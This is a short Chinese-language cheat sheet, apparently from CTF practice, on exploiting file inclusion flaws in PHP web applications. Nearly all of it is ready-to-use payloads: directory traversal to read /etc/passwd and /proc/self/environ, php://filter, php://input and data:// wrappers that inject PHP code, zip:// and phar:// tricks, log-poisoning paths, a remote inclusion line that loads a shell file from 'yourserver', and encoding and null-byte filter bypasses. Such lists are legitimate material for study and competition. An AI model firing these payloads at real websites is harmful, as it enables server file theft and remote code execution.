# 文件包含 (LFI/RFI) 解题经验

## LFI检测

1. **基本测试**:
   - `?page=../../../etc/passwd`
   - `?page=php://filter/read=convert.base64-encode/resource=index.php`

2. **常见文件**:
   - `/etc/passwd`
   - `/var/www/html/index.php`
   - `/proc/self/environ`
   - `/proc/self/cmdline`

## 常用Payload

### PHP封装器
```
php://filter/read=convert.base64-encode/resource=flag.php
php://input
data://text/plain,<?php phpinfo();?>
```

### 日志包含
```
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
```

### 伪协议
```php://filter/read=convert.base64-encode/resource=flag.php
zip://uploads/file.zip%23test.php
phar://uploads/file.phar/test.php
```

## RFI利用

当 `allow_url_include = On`:
```
?file=http://yourserver/shell.txt
```

## 常见绕过

```
....//....//etc/passwd
..././..././etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL编码
/etc/passwd%00  # 截断
```
